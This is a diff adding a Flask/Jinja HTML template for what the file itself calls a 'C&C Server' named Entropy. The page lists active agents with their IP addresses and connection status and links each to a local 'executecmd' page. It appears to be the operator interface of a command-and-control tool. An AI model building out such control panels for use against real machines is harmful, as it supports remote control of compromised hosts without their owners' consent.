@@ -1,0 +1,37 @@
+<html>
+<head>
+	<title>C&C Server</title>
+	<meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+	<link 
+	rel  = "stylesheet"
+	type = "text/css"
+	href = "{{ url_for('static', filename = 'styles/agent.css') }}"
+ 	 >
+</head>
+<body class="container">
+	<div>
+	<h1>	<a href="/">E N T R O P Y</a>	</h1>
+	</div>
+	<div id="d2">
+	<button type="submit" href="#"> Active Agents</button>
+</div>
+<br>
+	{% for i in threads %}
+	<div id="d3">
+		<form id="f1">
+		<br>
+			<button type="submit">{{ i.name }} </button>
+			<h4>{{ ips[threads.index(i)] }}</h4>
+			<p> Connection Status - {{ activecon[threads.index(i)] }} </p>
+			<button id="b1" type="submit"> <a href="http://127.0.0.1:5000/{{ i.name }}/executecmd">Execute commands</a></button>
+		<br>
+		</form>
+	</div>		
+	{% endfor %}	
+	<br>
+	
+	<br>
+</body>
+</html>
